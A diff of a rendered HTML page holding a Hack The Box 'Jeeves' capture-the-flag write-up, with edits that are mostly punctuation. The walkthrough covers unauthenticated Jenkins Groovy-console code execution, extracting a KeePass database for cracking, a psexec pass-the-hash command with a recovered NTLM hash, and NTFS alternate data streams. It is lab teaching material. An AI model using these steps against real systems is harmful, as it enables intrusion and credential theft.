@@ -52,7 +52,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-jeeves/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -198,7 +198,7 @@ stroke-linejoin="round" class="feather feather-home">
     <div class="mini-toc-content" id="miniTocContent"></div>
 </div>
             <div class="page-content">
-                <p>Windows box with two web services and a theme. Port 80 presents a fake Ask Jeeves search engine that sends everything to a static error page - pure misdirection. Port 50000 runs Jetty, which is the real surface: a Jenkins instance that requires no authentication and exposes a Groovy script console you can run arbitrary code in. The privilege escalation is a KeePass database sitting in kohsuke&rsquo;s Documents folder. Inside it, an NTLM hash stored as a password that works for pass-the-hash as Administrator. Then one more trick at the end: the root flag isn&rsquo;t in <code>hm.txt</code>, it&rsquo;s in an alternate data stream attached to it, invisible to a normal directory listing.</p>
+                <p>Windows box with two web services and a theme. Port 80 presents a fake Ask Jeeves search engine that sends everything to a static error page, pure misdirection. Port 50000 runs Jetty, which is the real surface: a Jenkins instance that requires no authentication and exposes a Groovy script console you can run arbitrary code in. The privilege escalation is a KeePass database sitting in kohsuke&rsquo;s Documents folder. Inside it, an NTLM hash stored as a password that works for pass-the-hash as Administrator. Then one more trick at the end: the root flag isn&rsquo;t in <code>hm.txt</code>, it&rsquo;s in an alternate data stream attached to it, invisible to a normal directory listing.</p>
 <h2 id="recon">Recon</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ✗ sudo nmap -sV -sC -T4 <span class="nv">$DC</span>
 </span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-06-08 09:21 +0100
@@ -231,7 +231,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
 </span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
-</span></span></code></pre></div><p>Four ports: 80, 135, 445, 50000. SMB signing is off, which is worth noting. No domain - <code>workgroup: WORKGROUP</code>, so this isn&rsquo;t an AD box. Guest and null SMB auth both failed:</p>
+</span></span></code></pre></div><p>Four ports: 80, 135, 445, 50000. SMB signing is off, which is worth noting. No domain, <code>workgroup: WORKGROUP</code>, so this isn&rsquo;t an AD box. Guest and null SMB auth both failed:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ❯ nxc smb <span class="nv">$DC</span> -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span>
 </span></span><span class="line"><span class="cl">SMB         10.129.228.112  <span class="m">445</span>    JEEVES           <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> Pro <span class="m">10586</span> x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
 </span></span><span class="line"><span class="cl">SMB         10.129.228.112  <span class="m">445</span>    JEEVES           <span class="o">[</span>-<span class="o">]</span> Jeeves<span class="se">\:</span> STATUS_ACCESS_DENIED 
@@ -241,9 +241,9 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">SMB         10.129.228.112  <span class="m">445</span>    JEEVES           <span class="o">[</span>-<span class="o">]</span> Jeeves<span class="se">\g</span>uest: STATUS_ACCOUNT_DISABLED
 </span></span></code></pre></div><p>Port 80 was the fake Ask Jeeves search page:</p>
 <p><img src="/images/writeups/htb-jeeves/web-ask-jeeves-search.png" alt="The Ask Jeeves themed search page on port 80 with a search bar that redirects to a static error page"></p>
-<p>Every search just landed on a static <code>error.html</code>. Looking at the source confirmed it - the form <code>action</code> points to <code>error.html</code> unconditionally. The error page itself leaks something though:</p>
+<p>Every search just landed on a static <code>error.html</code>. Looking at the source confirmed it. The form <code>action</code> points to <code>error.html</code> unconditionally. The error page itself leaks something though:</p>
 <p><img src="/images/writeups/htb-jeeves/web-sql-error-mssql-version.png" alt="Static error page leaking Microsoft SQL Server 2005 version from a type conversion exception"></p>
-<p>A SQL Server type conversion error with a full stack trace. The page is static - this isn&rsquo;t live SQL output, it&rsquo;s a hardcoded error page used as a decoy. The MSSQL version shown is from 2005 on Windows NT 5.0, which doesn&rsquo;t match the actual OS. Port 80 is a dead end.</p>
+<p>A SQL Server type conversion error with a full stack trace. The page is static. This isn&rsquo;t live SQL output, it&rsquo;s a hardcoded error page used as a decoy. The MSSQL version shown is from 2005 on Windows NT 5.0, which doesn&rsquo;t match the actual OS. Port 80 is a dead end.</p>
 <h2 id="jenkins-on-jetty">Jenkins on Jetty</h2>
 <p>Port 50000 returned a 404 on <code>/</code>. Jetty is a Java servlet container commonly used to host Jenkins, and <code>9.4.z-SNAPSHOT</code> reads as a development build. Automated fuzzing with a general wordlist found nothing. A shorter targeted list for common Java application paths found it:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ❯ <span class="k">for</span> path in jenkins askjeeves jeeves manager admin console app portal service api rest ws struts spring<span class="p">;</span> <span class="k">do</span>
@@ -258,8 +258,8 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">...
 </span></span></code></pre></div><p><code>/askjeeves</code> returned 200. Opened it in a browser:</p>
 <p><img src="/images/writeups/htb-jeeves/web-jenkins-unauthenticated-dashboard.png" alt="Jenkins dashboard at /askjeeves on port 50000, fully accessible without authentication"></p>
-<p>Full Jenkins dashboard, no authentication required. Every menu item accessible: New Item, People, Build History, Manage Jenkins, Credentials. This isn&rsquo;t a login bypass - there is no login. The instance was set up with security disabled.</p>
-<p>Jenkins has a Script Console under Manage Jenkins that executes arbitrary Groovy code server-side. Groovy runs on the JVM and has full access to Java&rsquo;s standard library, including <code>Runtime.exec()</code> and socket classes. This is intentional functionality for administrators - and it&rsquo;s directly accessible here without any credentials.</p>
+<p>Full Jenkins dashboard, no authentication required. Every menu item accessible: New Item, People, Build History, Manage Jenkins, Credentials. This isn&rsquo;t a login bypass. There is no login. The instance was set up with security disabled.</p>
+<p>Jenkins has a Script Console under Manage Jenkins that executes arbitrary Groovy code server-side. Groovy runs on the JVM and has full access to Java&rsquo;s standard library, including <code>Runtime.exec()</code> and socket classes. This is intentional functionality for administrators, and it&rsquo;s directly accessible here without any credentials.</p>
 <p><img src="/images/writeups/htb-jeeves/web-jenkins-script-console.png" alt="Jenkins Script Console under Manage Jenkins, accepting arbitrary Groovy code for server-side execution"></p>
 <h2 id="groovy-rce">Groovy RCE</h2>
 <p>The reverse shell payload uses Java&rsquo;s <code>ProcessBuilder</code> and <code>Socket</code> to open a cmd.exe process and wire its I/O to a network connection:</p>
@@ -286,7 +286,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\.</span>jenkins&gt;whoami
 </span></span><span class="line"><span class="cl">jeeves<span class="se">\k</span>ohsuke
-</span></span></code></pre></div><p>Shell as <code>kohsuke</code>. Jenkins was running from <code>C:\Users\Administrator\.jenkins</code> - not from an Administrator shell, just from that directory. <code>whoami /all</code>:</p>
+</span></span></code></pre></div><p>Shell as <code>kohsuke</code>. Jenkins was running from <code>C:\Users\Administrator\.jenkins</code>, not from an Administrator shell, just from that directory. <code>whoami /all</code>:</p>
 <pre tabindex="0"><code>USER INFORMATION
 ----------------
 
@@ -325,12 +325,12 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 SeTimeZonePrivilege           Change the time zone                      Disabled
 </code></pre><p>High Integrity Level and <code>SeImpersonatePrivilege</code> enabled. The obvious move was a potato exploit.</p>
-<p>I tried PrintSpoofer, GodPotato, and JuicyPotato. All failed. The reason is the shell context: a bare netcat reverse shell from a Windows service runs under a non-interactive service token. Potato exploits impersonate a higher-privileged token by coercing a SYSTEM-level service to authenticate to a local pipe you control. That impersonation step requires the current token to be an interactive session token - <code>NT AUTHORITY\SERVICE</code> in a non-interactive socket shell doesn&rsquo;t qualify. The spawned impersonated process has no interactive desktop session to attach to, so the exploit fails silently or errors out.</p>
+<p>I tried PrintSpoofer, GodPotato, and JuicyPotato. All failed. The reason is the shell context: a bare netcat reverse shell from a Windows service runs under a non-interactive service token. Potato exploits impersonate a higher-privileged token by coercing a SYSTEM-level service to authenticate to a local pipe you control. That impersonation step requires the current token to be an interactive session token. <code>NT AUTHORITY\SERVICE</code> in a non-interactive socket shell doesn&rsquo;t qualify. The spawned impersonated process has no interactive desktop session to attach to, so the exploit fails silently or errors out.</p>
 <p>Kept enumerating.</p>
 <h2 id="keepass-the-ceh-database">KeePass: The CEH Database</h2>
 <p>kohsuke&rsquo;s Documents folder had one file:</p>
 <pre tabindex="0"><code>C:\Users\kohsuke\Documents\CEH.kdbx
-</code></pre><p>KeePass is a local password manager. It stores credentials encrypted in a <code>.kdbx</code> file, protected by a master password. The whole database is one encrypted blob - without the master password you can&rsquo;t read any entry. But the encrypted blob itself is a known format and can be attacked offline.</p>
+</code></pre><p>KeePass is a local password manager. It stores credentials encrypted in a <code>.kdbx</code> file, protected by a master password. The whole database is one encrypted blob. Without the master password you can&rsquo;t read any entry. But the encrypted blob itself is a known format and can be attacked offline.</p>
 <p><code>keepass2john</code> extracts a crackable hash from the file:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ✗ sudo smbserver.py share . -smb2support
 </span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
@@ -396,8 +396,8 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 </span></span><span class="line"><span class="cl"> Pass: lCEUnYPjNfIuPZSzOySA
 </span></span><span class="line"><span class="cl">  URL: 
 </span></span><span class="line"><span class="cl">Notes:
-</span></span></code></pre></div><p>&ldquo;Backup stuff&rdquo; has a password that&rsquo;s formatted as an NTLM hash: <code>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code>. The first half (<code>aad3b435b51404eeaad3b435b51404ee</code>) is the blank LM hash - Windows uses this as a placeholder when LM hashing is disabled. The second half is the NT hash. Someone stored an NTLM hash directly in a KeePass entry, probably as a backup credential.</p>
-<p>NTLM doesn&rsquo;t require you to know the plaintext password - you can authenticate directly with the hash. <code>psexec.py</code> with <code>-hashes</code> handles this:</p>
+</span></span></code></pre></div><p>&ldquo;Backup stuff&rdquo; has a password that&rsquo;s formatted as an NTLM hash: <code>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code>. The first half (<code>aad3b435b51404eeaad3b435b51404ee</code>) is the blank LM hash. Windows uses this as a placeholder when LM hashing is disabled. The second half is the NT hash. Someone stored an NTLM hash directly in a KeePass entry, probably as a backup credential.</p>
+<p>NTLM doesn&rsquo;t require you to know the plaintext password. You can authenticate directly with the hash. <code>psexec.py</code> with <code>-hashes</code> handles this:</p>
 <h2 id="pass-the-hash-to-system">Pass-the-Hash to SYSTEM</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ✗ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.228.112
 </span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
@@ -426,7 +426,7 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 C:\Users\Administrator\Desktop&gt; type hm.txt
 The flag is elsewhere.  Look deeper.
 </code></pre><h2 id="ntfs-alternate-data-streams">NTFS Alternate Data Streams</h2>
-<p>NTFS allows files to have multiple named data streams attached to the same filename. A regular file has one default stream (<code>$DATA</code>) - that&rsquo;s what <code>type</code> reads and what <code>dir</code> shows the size of. You can attach additional named streams to the same file and they&rsquo;re completely invisible to a normal <code>dir</code> listing. The only way to see them is with <code>dir /r</code>, which shows alternate streams explicitly:</p>
+<p>NTFS allows files to have multiple named data streams attached to the same filename. A regular file has one default stream (<code>$DATA</code>), that&rsquo;s what <code>type</code> reads and what <code>dir</code> shows the size of. You can attach additional named streams to the same file and they&rsquo;re completely invisible to a normal <code>dir</code> listing. The only way to see them is with <code>dir /r</code>, which shows alternate streams explicitly:</p>
 <pre tabindex="0"><code>C:\Users\Administrator\Desktop&gt; dir /r C:\Users\Administrator\Desktop\hm.txt
  Volume in drive C has no label.
  Volume Serial Number is 71A1-6FA1
@@ -435,9 +435,9 @@ The flag is elsewhere.  Look deeper.
 
 12/24/2017  03:51 AM                36 hm.txt
                                     34 hm.txt:root.txt:$DATA
-</code></pre><p><code>hm.txt:root.txt:$DATA</code> - there&rsquo;s a second stream named <code>root.txt</code> attached to <code>hm.txt</code>. Reading it by name:</p>
+</code></pre><p><code>hm.txt:root.txt:$DATA</code>. There&rsquo;s a second stream named <code>root.txt</code> attached to <code>hm.txt</code>. Reading it by name:</p>
 <pre tabindex="0"><code>C:\Users\Administrator\Desktop&gt; more &lt; hm.txt:root.txt
-</code></pre><p>Root flag. The NTFS ADS trick is a classic HTB finale - easy once you know it, completely invisible if you don&rsquo;t think to look. Worth keeping <code>dir /r</code> in muscle memory for any Windows box where a flag file looks suspiciously small or returns a troll message.</p>
+</code></pre><p>Root flag. The NTFS ADS trick is a classic HTB finale, easy once you know it, completely invisible if you don&rsquo;t think to look. Worth keeping <code>dir /r</code> in muscle memory for any Windows box where a flag file looks suspiciously small or returns a troll message.</p>
 
             </div>
         </article></main>
@@ -562,6 +562,11 @@ The flag is elsewhere.  Look deeper.
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
